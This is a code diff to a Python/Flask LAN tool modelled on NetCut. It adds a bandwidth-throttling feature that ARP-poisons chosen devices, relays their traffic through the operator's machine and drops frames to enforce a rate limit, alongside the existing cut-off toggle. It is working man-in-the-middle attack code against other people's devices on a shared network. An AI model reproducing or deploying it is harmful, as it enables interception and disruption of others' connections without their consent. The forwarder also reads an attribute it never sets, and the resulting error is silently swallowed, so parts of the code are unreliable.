@@ -20,6 +20,7 @@ class Device:
         self.custom_name = custom_name or ""
         self.state = "Connected"
         self.spoof_stop = None; self.spoof_thread = None
+        self.throttle_kbps = None
         self.first_seen = time.time()
         self.last_seen = time.time()
 
@@ -31,6 +32,7 @@ class Device:
         return {"ip": self.ip, "mac": self.mac, "hostname": self.hostname,
                 "vendor": self.vendor, "custom_name": self.custom_name,
                 "state": self.state, "display_name": dn,
+                "throttle_kbps": self.throttle_kbps,
                 "first_seen": self.first_seen, "last_seen": self.last_seen}
 
 class TrafficMonitor:
@@ -61,6 +63,97 @@ class TrafficMonitor:
         with self.lock:
             return {ip: round(b/1024, 1) for ip, b in self.traffic.items()}
 
+class TokenBucketForwarder:
+    """Real per-device bandwidth shaping (MITM relay).
+
+    The target device is ARP-poisoned so its traffic to/from the gateway
+    physically crosses our NIC. This class sniffs those frames, enforces a
+    token bucket per target (dropping frames that exceed the configured
+    bit-rate), and re-transmits the allowed frames out the same NIC on the
+    correct leg. The poison itself is kept alive by the caller's spoof loop.
+    """
+    def __init__(self):
+        self._targets = {}
+        self.lock = threading.Lock()
+        self.thread = None
+        self.stop_event = threading.Event()
+        self.gateway_ip = None; self.gateway_mac = None
+        self.our_mac = None; self.interface = None
+
+    def configure(self, gateway_ip=None, gateway_mac=None, our_mac=None, interface=None):
+        with self.lock:
+            if gateway_ip is not None: self.gateway_ip = gateway_ip
+            if gateway_mac is not None: self.gateway_mac = gateway_mac
+            if our_mac is not None: self.our_mac = our_mac
+            if interface is not None: self.interface = interface
+
+    def set_target(self, ip, kbps, mac=None):
+        with self.lock:
+            if kbps and kbps > 0:
+                bps = (kbps * 1000) / 8.0
+                self._targets[ip] = {"kbps": kbps, "tokens": bps,
+                                     "last": time.time(), "mac": mac}
+            else:
+                self._targets.pop(ip, None)
+
+    def _entry(self, ip):
+        with self.lock:
+            return self._targets.get(ip)
+
+    def active(self):
+        with self.lock:
+            return {ip: t["kbps"] for ip, t in self._targets.items()}
+
+    def start(self):
+        self.stop_event.clear()
+        if self.thread and self.thread.is_alive():
+            return
+        self.thread = threading.Thread(target=self._run, args=(self.interface,), daemon=True)
+        self.thread.start()
+
+    def set_stop(self):
+        self.stop_event.set()
+
+    def clear(self):
+        with self.lock:
+            self._targets.clear()
+
+    def _run(self, interface):
+        sniff(iface=interface, prn=self._on_packet, store=0,
+              stop_filter=lambda p: self.stop_event.is_set())
+
+    def _on_packet(self, pkt):
+        try:
+            if Ether not in pkt or IP not in pkt: return
+            e = pkt[Ether]; ip = pkt[IP]
+            if e.src == self.our_mac: return
+            if self.gateway_ip is None: return
+            gw = self.gateway_ip
+            src, dst = ip.src, ip.dst
+            entry = None; dev_mac = None
+            if src == gw:
+                entry = self._entry(dst)
+            elif dst == gw and src == self.our_ip:
+                return
+            elif dst == gw:
+                entry = self._entry(src)
+            else:
+                entry = self._entry(src) or self._entry(dst) or None
+            if entry is None: return
+            now = time.time()
+            bps = (entry["kbps"] * 1000) / 8.0
+            entry["tokens"] = min(entry["tokens"] + (now - entry["last"]) * bps, bps * 2)
+            entry["last"] = now
+            if len(pkt) > entry["tokens"]: return
+            entry["tokens"] -= len(pkt)
+            if src == gw:
+                out = Ether(dst=entry["mac"], src=self.our_mac) / pkt[IP]
+            else:
+                out = Ether(dst=self.gateway_mac, src=self.our_mac) / pkt[IP]
+            sendp(out, iface=self.interface, verbose=False)
+        except Exception:
+            pass
+
 class NetCutController:
     def __init__(self):
         self.interface = None; self.ip = None; self._iface_idx = None
@@ -68,9 +161,11 @@ class NetCutController:
         self.devices = []; self.saved_data = self.load_saved()
         self.scanning = False; self.scan_progress = 0
         self.traffic = TrafficMonitor()
+        self.forwarder = TokenBucketForwarder()
         self.auto_scan_stop = threading.Event()
         self.auto_scan_thread = None
         self.our_mac = None
+        self.our_ip = None
 
     def load_saved(self):
         if DATA_FILE.exists():
@@ -133,6 +228,8 @@ class NetCutController:
         if not sel: sel = available[0]
         self.interface, self.ip, _, self._iface_idx = sel
         self.our_mac = get_if_hwaddr(self.interface)
+        self.our_ip = self.ip
+        self.forwarder.configure(interface=self.interface, gateway_ip=gw, our_mac=self.our_mac)
         if not gw: return None, "No default gateway."
         self.gateway_ip = gw
         return True, None
@@ -174,13 +271,15 @@ class NetCutController:
         self.scan_progress = 10
         found = self.arp_scan(passes=3)
         self.scan_progress = 60
+        self.forwarder.configure(gateway_mac=self.gateway_mac)
         self.merge_scan_results(found)
         for d in self.devices:
-            if d.state == "Disconnected":
+            if d.state in ("Disconnected", "Throttled"):
                 self._start_spoof(d)
         self.devices.sort(key=lambda x: x.ip)
         self.scan_progress = 100
         self.traffic.stop(); self.traffic.start(self.interface)
+        self.forwarder.start()
         self.scanning = False
         return self.devices
 
@@ -207,9 +306,11 @@ class NetCutController:
                     self.gateway_mac = mac
                 elif saved.get("state") == "Disconnected":
                     dev.state = "Disconnected"
+                elif saved.get("state") == "Throttled":
+                    dev.state = "Throttled"
+                    dev.throttle_kbps = saved.get("throttle_kbps", 256)
+                    self.forwarder.set_target(found[mac], dev.throttle_kbps, mac)
                 self.devices.append(dev)
-                if dev.state == "Disconnected":
-                    self._start_spoof(dev)
 
         for mac, ip in found.items():
             dev = by_mac.get(mac)
@@ -219,6 +320,8 @@ class NetCutController:
             dev.last_seen = now
             if dev.state == "Offline":
                 dev.state = "Connected"
+            if dev.state == "Throttled":
+                self.forwarder.set_target(dev.ip, dev.throttle_kbps, dev.mac)
             if dev.state == "Disconnected":
                 self._start_spoof(dev)
 
@@ -262,14 +365,43 @@ class NetCutController:
                 if d.state == "Connected":
                     d.state = "Disconnected"
                     self._start_spoof(d)
-                    self.save_device(mac, {"state": "Disconnected"})
+                    self.save_device(mac, {"state": "Disconnected", "throttle_kbps": None})
                     return True, "Disconnected"
+                elif d.state == "Disconnected":
+                    self._stop_spoof(d)
+                    self._restore(d)
+                    d.state = "Connected"
+                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
+                    return True, "Connected"
                 else:
                     self._stop_spoof(d)
                     self._restore(d)
                     d.state = "Connected"
-                    self.save_device(mac, {"state": "Connected"})
+                    d.throttle_kbps = None
+                    self.forwarder.set_target(d.ip, 0)
+                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                     return True, "Connected"
+        return False, "Not found."
+
+    def set_throttle(self, mac, kbps):
+        for d in self.devices:
+            if d.mac == mac:
+                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
+                if d.mac == self.our_mac: return False, "Cannot touch your own device."
+                if not kbps or kbps <= 0:
+                    self._stop_spoof(d)
+                    self._restore(d)
+                    d.state = "Connected"
+                    d.throttle_kbps = None
+                    self.forwarder.set_target(d.ip, 0)
+                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
+                    return True, "Restored"
+                d.throttle_kbps = kbps
+                d.state = "Throttled"
+                self._start_spoof(d)
+                self.forwarder.set_target(d.ip, kbps, d.mac)
+                self.save_device(mac, {"state": "Throttled", "throttle_kbps": kbps})
+                return True, f"Throttled to {kbps} kbps"
         return False, "Not found."
 
     def rename_device(self, mac, name):
@@ -282,10 +414,13 @@ class NetCutController:
 
     def restore_all(self):
         self.traffic.stop()
+        self.forwarder.set_stop(); self.forwarder.clear()
         if self.auto_scan_thread: self.auto_scan_stop.set()
         for d in self.devices:
             self._stop_spoof(d); self._restore(d)
             d.state = "Connected"
+            d.throttle_kbps = None
+            self.save_device(d.mac, {"state": "Connected", "throttle_kbps": None})
 
     def auto_scan_loop(self):
         while not self.auto_scan_stop.is_set():
@@ -329,6 +464,12 @@ def scan():
 def toggle():
     data = request.get_json()
     ok, s = controller.toggle_device(data['mac'])
+    return jsonify({"success": ok, "state": s})
+
+@app.route('/api/throttle', methods=['POST'])
+def throttle():
+    data = request.get_json()
+    ok, s = controller.set_throttle(data['mac'], int(data.get('kbps', 0)))
     return jsonify({"success": ok, "state": s})
 
 @app.route('/api/rename', methods=['POST'])
